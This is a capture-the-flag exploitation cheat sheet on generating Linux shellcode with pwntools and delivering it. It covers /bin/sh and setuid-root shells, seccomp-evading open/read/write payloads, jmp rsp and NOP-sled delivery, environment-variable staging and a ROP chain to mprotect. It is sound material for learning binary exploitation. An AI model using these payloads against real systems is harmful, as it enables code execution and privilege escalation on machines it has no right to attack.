# Shellcode — generation, delivery, mprotect

## 1. Generate with pwntools

```python
from pwn import *
context.arch = "amd64"          # i386, arm, aarch64, mips...; set BEFORE asm()
context.os = "linux"

sc      = shellcraft.amd64.linux.sh()     # execve("/bin/sh", NULL, NULL)
payload = asm(sc)
print(disasm(payload))                    # verify what you ship
```

- `asm()` uses GNU `as` for the target arch (system binutils covers native;
  cross-binutils for foreign archs).
- Bad bytes: NULs break `read()`/`scanf` delivery — assert
  `b"\x00" not in payload`; switch to a shorter stage or a decoder stub.
- CLI: `scripts/ctf shellcraft amd64.linux.sh` prints the assembly.

## 2. /bin/sh variants

| Need | Build |
|---|---|
| plain shell | `shellcraft.amd64.linux.sh()` |
| setuid target | prepend `shellcraft.amd64.linux.setuid(0)` (run before any privdrop/drop_privileges path) |
| shell with no I/O (socket service) | `dup2` the connection fd to 0/1/2 before execve: add `shellcraft.amd64.linux.dup2(fd, n)` for n in 0,1,2 |
| flag read under seccomp | ORW, section 3 |

## 3. ORW (seccomp-friendly)

When seccomp blocks execve (`references/mitigations.md` section 6), read the
flag with open/read/write:

```python
sc  = shellcraft.amd64.linux.open("/flag", 0, 0)    # 0 = O_RDONLY; rax = fd
sc += shellcraft.amd64.linux.read("rax", "rsp", 0x100)
sc += shellcraft.amd64.linux.write(1, "rsp", 0x100)
payload = asm(sc)
```

- Buffer `'rsp'` assumes a real stack; in ROP use a writable address (bss).
- Same chain as ROP calls: `open`/`openat` + `read` + `write` via libc or raw
  syscalls (`references/stack.md`).
- Multiple/unknown flag paths: loop open over a candidate list, or openat a
  directory and getdents — keep it to open/read/write unless the filter says
  otherwise.

## 4. Delivery: where the bytes run

| Situation | Delivery |
|---|---|
| NX off, input lands on stack | jump to the buffer (leak its address) or `jmp rsp` right after the return address |
| NX off, target address imprecise | NOP sled: `b"\x90" * n + payload` widens the landing zone |
| NX on | ROP → mprotect → shellcode (section 6) or stay pure ROP |

`jmp rsp` = bytes `ff e4` (valid on i386/amd64); `push rsp; ret` = `54 c3`.
Shellcode placed *after* the overwritten return address:

```python
payload = flat(b"A" * offset, jmp_rsp, asm(sc))   # ret lands on jmp rsp
```

Find gadgets:
`scripts/ctf ROPgadget --binary ./chal | grep -E 'jmp rsp|push rsp'`.

## 5. Shellcode in the environment

When the overflow cannot hold the code, park a sled + shellcode in an env
var; the copy lives near the stack top:

```bash
export PWN=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*0x200 + open('sc.bin','rb').read())")
```

- Locate under gdb: `p (char *)environ`, then scan:
  `find $rsp, $rsp+0x8000, 0x9090909090909090` — the hit is your target.
- 32-bit targets: ASLR entropy is low → brute force or a big sled works.
- Full ASLR on amd64: needs a leak or a partial overwrite of a stack return;
  the sled makes 1-2 byte partial overwrites reliable (aim mid-sled).

## 6. NX on: ROP → mprotect → bss → jump

```python
elf = ELF("./chal")
rop = ROP(elf)
page = elf.bss(0x800) & ~0xfff         # page-aligned writable scratch
sc   = asm(shellcraft.amd64.linux.sh())

rop.call("mprotect", [page, 0x1000, 7])   # PROT_READ|PROT_WRITE|PROT_EXEC
rop.call("read", [0, page, len(sc)])      # deliver shellcode to the page
rop.raw(page)                             # ret slides into it
payload = flat({offset: rop.chain()})
io.sendline(payload)
io.send(sc)                               # consumed by read()
```

- `mprotect` requires a page-aligned address over a real mapping — bss
  qualifies (pick a page within the mapped data segment).
- No PLT `mprotect`/`read` (static binary): raw syscalls — rax = 10 is
  SYS_mprotect on amd64, with `pop rdi/rsi/rdx` gadgets + `syscall; ret`; or
  do it in one shot with SROP (`references/stack.md` section 5).
